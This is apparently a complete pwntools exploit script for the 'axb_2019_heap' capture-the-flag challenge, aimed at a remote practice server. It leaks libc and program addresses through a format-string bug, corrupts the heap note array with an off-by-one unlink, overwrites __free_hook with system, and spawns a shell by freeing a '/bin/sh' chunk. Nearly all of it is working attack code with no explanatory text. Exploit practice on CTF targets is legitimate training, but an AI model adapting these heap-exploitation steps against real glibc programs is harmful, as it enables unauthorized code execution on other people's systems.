from pwn import *

#context.log_level = 'debug'

pn = './axb_2019_heap'
#p = process(pn)
p = remote('node4.buuoj.cn', 29186)
elf = ELF(pn)
#libc = ELF('libc-2.23.so')
libc = ELF('libc-2.23.buu.so')

#leak libc
name = b'%11$p%15$p'

p.sendlineafter(b'name: ', name)

p.recvuntil(b', ')
proc_base = (int(p.recv(14), 16) - 28) - elf.sym['main']
libc_base = (int(p.recv(14), 16) - 240) - libc.sym['__libc_start_main']

print('[+] proc_base -> {}'.format(hex(proc_base)))
print('[+] libc_base -> {}'.format(hex(libc_base)))

def alloc(index, size, content):
    p.sendlineafter(b'>> ', b'1')
    p.sendlineafter(b'create (0-10):', str(index).encode())
    p.sendlineafter(b'size:', str(size).encode())
    p.sendlineafter(b'content: ', content)

def edit(index, content):
    p.sendlineafter(b'>> ', b'4')
    p.sendlineafter(b'index:', str(index).encode())
    p.sendlineafter(b'content: ', content)

def delete(index):
    p.sendlineafter(b'>> ', b'2')
    p.sendlineafter(b'index:', str(index).encode())

#off by one to unlink
heaparray = proc_base + elf.sym['note']
print('[+] note -> {}'.format(hex(heaparray)))

alloc(0, 0x88, b'a')
alloc(1, 0x88, b'a')
alloc(2, 0x90, b'/bin/sh')

payload = p64(0) + p64(0x81)
payload += p64(heaparray - 0x18) + p64(heaparray - 0x10)
payload += b'a' * 0x60
payload += p64(0x80) + b'\x90'
edit(0, payload)

delete(1)

#p.interactive()

free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

print('[+] system -> {}'.format(hex(system)))
print('[+] free_hook -> {}'.format(hex(free_hook)))
print('[*] overwrite heaparray...')

payload = p64(0) * 3 + p64(free_hook) + p64(0x80)
edit(0, payload)
print('[+] done!')
print('[*] overwrite free_hook...')
edit(0, p64(system))
print('[+] done!')
print('[+] try getshell...')

delete(2)

p.interactive()